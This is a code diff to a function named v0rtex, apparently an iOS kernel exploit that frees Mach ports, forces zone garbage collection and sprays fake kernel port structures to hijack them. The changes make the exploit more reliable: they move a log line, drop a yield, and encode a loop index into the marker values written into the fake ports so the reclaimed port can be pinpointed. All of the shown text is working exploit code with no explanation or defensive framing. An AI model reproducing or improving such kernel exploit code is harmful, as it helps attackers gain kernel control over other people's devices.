@@ -773,9 +773,9 @@ kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
 
     sched_yield();
     ret = mach_ports_register(self, &client, 1); // gonna use that later
-    LOG("mach_ports_register: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
+        LOG("mach_ports_register: %s", mach_error_string(ret));
         goto out;
     }
 
@@ -786,7 +786,6 @@ kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
     // Release port with ool port refs
     RELEASE_PORT(stuffport);
 
-    sched_yield();
     ret = my_mach_zone_force_gc(host);
     if(ret != KERN_SUCCESS)
     {
@@ -800,10 +799,10 @@ kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
         kport_t *dptr = (kport_t*)&dict[5];
         for(size_t j = 0; j < DATA_SIZE / sizeof(kport_t); ++j)
         {
-            *(((volatile uint32_t*)&dptr[j].ip_context) + 1) = 0x10000000 | i;
+            *(((volatile uint32_t*)&dptr[j].ip_context) + 1) = 0x10000000 | (j << 20) | i;
 #ifdef __LP64__
-            *(volatile uint32_t*)&dptr[j].ip_messages.port.pad = 0x20000000 | i;
-            *(volatile uint32_t*)&dptr[j].ip_lock.pad = 0x30000000 | i;
+            *(volatile uint32_t*)&dptr[j].ip_messages.port.pad = 0x20000000 | (j << 20) | i;
+            *(volatile uint32_t*)&dptr[j].ip_lock.pad = 0x30000000 | (j << 20) | i;
 #endif
         }
         uint32_t dummy = 0;
@@ -832,7 +831,7 @@ kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
     }
     uint32_t shift_off = sizeof(kport_t) - (((shift_mask - 1) * 0x1000) % sizeof(kport_t));
 
-    uint32_t idx = (ctx >> 32) & 0xfffffff;
+    uint32_t idx = (ctx >> 32) & 0xfffff;
     dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(idx);
     uint32_t request[] =
     {
